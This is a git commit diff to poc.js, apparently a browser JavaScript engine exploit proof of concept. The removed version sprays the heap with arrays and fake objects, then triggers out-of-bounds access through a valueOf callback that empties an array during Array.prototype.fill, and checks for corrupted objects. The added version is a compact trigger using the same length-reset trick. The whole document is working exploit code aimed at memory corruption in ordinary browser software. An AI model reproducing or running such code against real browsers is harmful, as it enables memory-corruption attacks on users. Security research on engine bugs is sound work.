08f800a8562c70a9913da06f0be377a3ff6d7cad
Dark-life944 <168915806+Dark-life944@users.noreply.github.com>
2025-10-25 02:58:06 +0100

    Update poc.js

--- 5/poc.js
+++ 5/poc.js
@@ -1,71 +1,14 @@
-
-var spray = [];
-for (var i = 0; i < 1000; i++) {
-    var size = 64 + (i % 8) * 32; // 64, 96, 128, 160, ...
-    var arr = new Array(size);
-    
-    
-    if (i % 10 === 5) {
-        arr.target_object = {
-            type: "SENSITIVE",
-            vtable: 0x41414141,
-            exploit: function() { return 0x42424242; }
-        };
-    }
-    
-    spray.push(arr);
+const v0 = [];
+for (let i2 = 0; i2 < 1000000; i2++) {
+    v0[i2] = [];
 }
-
-
-var victim_index = 500;
-var victim = new Array(10000); 
-
-var trigger = {
-    valueOf: function() {
-        victim.length = 0;
-        return 0x1000; // OOB 
-    }
+const v10 = new Object(Object, v0);
+function f11() {
+    v0.length = 0;
+    return 0;
+}
+const o14 = {
+    "valueOf": f11,
 };
-
-var pointer_like_data = [];
-for (var i = 0; i < 10000; i++) {
-    pointer_like_data.push(0x40000000 + i * 0x1000); 
-}
-
-victim.fill(pointer_like_data, trigger, 0x2000);
-
-
-var exploitation_success = false;
-
-for (var i = 0; i < spray.length; i++) {
-    var arr = spray[i];
-    
-    
-    if (arr.target_object) {
-        try {
-            var result = arr.target_object.exploit();
-            if (result !== 0x42424242) {
-                alert(" VTABLE CORRUPTION: spray[" + i + "] returned " + result.toString(16));
-                exploitation_success = true;
-            }
-        } catch (e) {
-            alert(" OBJECT CORRUPTION: spray[" + i + "] crashed - " + e);
-            exploitation_success = true;
-        }
-    }
-    
-    
-    for (var j = 0; j < Math.min(20, arr.length); j++) {
-        if (arr[j] >= 0x40000000 && arr[j] <= 0x40000000 + 0x100000) {
-            alert(" POINTER-LIKE DATA FOUND: spray[" + i + "][" + j + "] = 0x" + arr[j].toString(16));
-            exploitation_success = true;
-        }
-    }
-}
-
-if (exploitation_success) {
-    alert(" EXPLOITATION TEST SUCCESSFUL!");
-    alert("The OOB can reach sensitive objects in mixed heap!");
-} else {
-    alert("may have some isolation, but less than Libpas");
-}
+v0.fill(v10, o14);
+alert("done");
